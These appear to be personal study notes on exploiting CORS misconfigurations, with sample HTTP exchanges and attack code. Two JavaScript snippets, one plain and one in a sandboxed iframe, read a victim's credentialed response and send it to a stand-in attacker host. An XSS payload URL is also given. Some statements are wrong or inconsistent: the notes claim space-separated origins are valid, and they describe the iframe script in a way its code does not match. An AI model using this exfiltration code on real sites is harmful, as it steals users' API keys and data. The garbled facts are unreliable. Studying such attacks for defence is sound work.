![image](https://beren-obsidian-images.imgix.net/125e3a3f0c1315d744e71752dd1f0aa2.png)
##### ***Origin reflection***
When there is user supplied input to a request that places the `Origin` header value into the response value of the `Access-Control-Allow-Origin` header, you can make arbitrary requests from the user supplied input domain that you control.
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://malicous-domain.com
Cookie: sessionid=stolenusercookie

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://malicous-domain.com
Access-Control-Allow-Credentials: true

{'apiKey': 'sdfgfdgfdgdgfd'}
```

You can create the malicious domain to host this JavaScript that when a user visits, it loads their cookie and makes a request to get their API key from the vulnerable website:
```
let req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'vulnerable-website.com/api/requestApiKey', true)
req.withCredentials = true;
req.send();

function reqListener(){
	location='http://malicous-domain.com/log?key='+this.responseText
}
```
##### ***Origin starts with a URL***
If the `Origin` header starts with a URL like `https://vulnerable-website.com` you can host a malicious website that starts with that subdomain.
```
GET /api HTTP/1.1
Host: vulnerable-website.com
Origin: https://vulnerable-website.com.malicous-domain.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://vulnerable-website.com.malicous-domain.com
```
##### ***Trusting any origin that has the domain included***
When a vulnerable website has the `Origin` header and the `Host` header set to a domain name, they may be vulnerable to a domain origin that still includes the domain.
```
GET /tr/api HTTP/1.1
Host: vulnerable-website.com
Origin: notvulnerable-website.com

HTTP/1.1
Content-Security-Policy: frame-anscestors
Strict-Transport-Security: max-age=3150000
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=blockl
Access-Control-Allow-Origin: https://notvulnerable.org
Access-Control-Allow-Credentials: true
```

As you can see, even with all the headers and security mechanisms in place, if you have a domain that at least ends with the vulnerable website's domain name, they will be vulnerable to a CORS misconfiguration. 
##### ***NULL origin***
Try using the null origin when making a request, the null origin can be found from Rapid7's [sonar.http](https://opendata.rapid7.com/sonar.http/), and also Shodan with the `Access-Control-Allow-Origin: null` search term.

The null origin is whitelisted on some websites because the local file system uses the null origin, HTML5 also has an attribute for iframes called `sandbox` the sandbox attribute is a security mechanism to stop an iframe from performing any harmful actions that would interact with the host website containing the iframe, what it does, is it isolates the iframe within the `null` origin, which is another reason for a website whitelisting the null origin. It could also be the case that what ever programming framework you are using, may automatically set the `Access-Control-Allow-Origin` header, but if you do not define it, it will be defaulted to `null`.

An example of such an attack could be hosting a website with the sandbox attribute in an iframe for the vulnerable website.
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://vulnerable-website.com',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
                location='malicous-website.com/log?key='+this.responseText;
        };
        </script>">
</iframe>
```

The JavaScript inside the iframe opens a new `XMLHttpRequest` to the vulnerable website and configures it to perform a GET request. The script then sends the request, and when a response is received (checked using `onreadystatechange`), it alerts the response text.

Because this script runs within an iframe that has a 'null' origin (due to the `sandbox` attribute), it will send the 'null' Origin header with the request. If the target server is misconfigured to allow 'null' origins, the request will succeed, potentially allowing for the retrieval of sensitive information.
##### ***Common header misconfigurations***
Websites enable CORS by sending the following HTTP response header; `Access-Control-Allow-Origin: https://example.com`. This setting adheres to the [[Same origin policy (SOP)]] by explicitly allowing resources to be shared only with `https://example.com`.

Using the `Access-Control-Allow-Origin` header can be useful for allowing one domain to make requests to the website, if you want to add more domains, you can separate them with spaces like: `Access-Control-Allow-Origin: http://foo.com http://bar.net`. 

**Misconfigured subdomain wildcard**
If you notice that the `Access-Control-Allow-Origin` is using a wildcard domain for a subdomain, then it has been misconfigured, as CORS does not support wildcards for subdomains: `Access-Control-Allow-Origin: *.vulnerable-website.com`. This will not work because the only wildcard CORS support is for every origin: `Access-Control-Allow-Origin: *`

**Restricted use of wildcard `ACAO` header with the `ACAC` header**
Using the wildcard with the `Access-Control-Allow-Origin` header disables the use of having the `Access-Control-Allow-Credentials` set to true, this will give the error of 'Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true.' The `Access-Control-Allow-Credentials` response header allows the sending of cookies or other user credentials to be included on cross-origin requests, now you can see why the use of these two headers is dangerous:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

To get around this, many websites will dynamically generate the `Access-Control-Allow-Origin` request header based on the user-supplied `Origin` header. If you see a HTTP response with any Access-Control-* headers but no origins declared, This suggests that the server is likely to produce the header based on the input it receives. Some servers, on the other hand, will issue CORS headers only when an incoming request includes the Origin header, which makes related security risks highly elusive.
##### ***Exploiting XSS via CORS trust relationships***
If a website that trusts an origin that is vulnerable to XSS that exists on a subdomain, then you can exploit its trust relationship. 

If you have found an XSS on a subdomain, you may be able to achieve results with this payload:
```
`https://subdomain.vulnerable-website.com/?xss=<script>cors-here</script>`
```
##### ***Breaking TLS with poorly configured CORS***
If a vulnerable website trusts a subdomain that is using HTTP instead of an HTTPs connection, the attacker can exploit the victims interaction with the vulnerable website.

The attacker could take the following steps in order to compromise the interaction of the vulnerable website:
1. The victim is phished or follows a link that the attacker has exploited with any of the following techniques:
	- [[DOM based XSS#***Open redirect***]]
	- [[Reflected XSS#***XSS in another subdomain***]]
	- Phishing
	- [[Clickjacking - notes#***Redirection with clickjacking***]]
2. The attacker intercepts the plain HTTP request, and returns a spoofed response containing the vulnerable website, this is usually achieved through a [[MITM#***Intercepting and spoofing HTTPS traffic***]] attack or an XSS vulnerability in a vulnerable subdomain.
##### ***Resources***
https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing
https://stackoverflow.com/questions/24687313/what-exactly-does-the-access-control-allow-credentials-header-do
https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#requests_with_credentials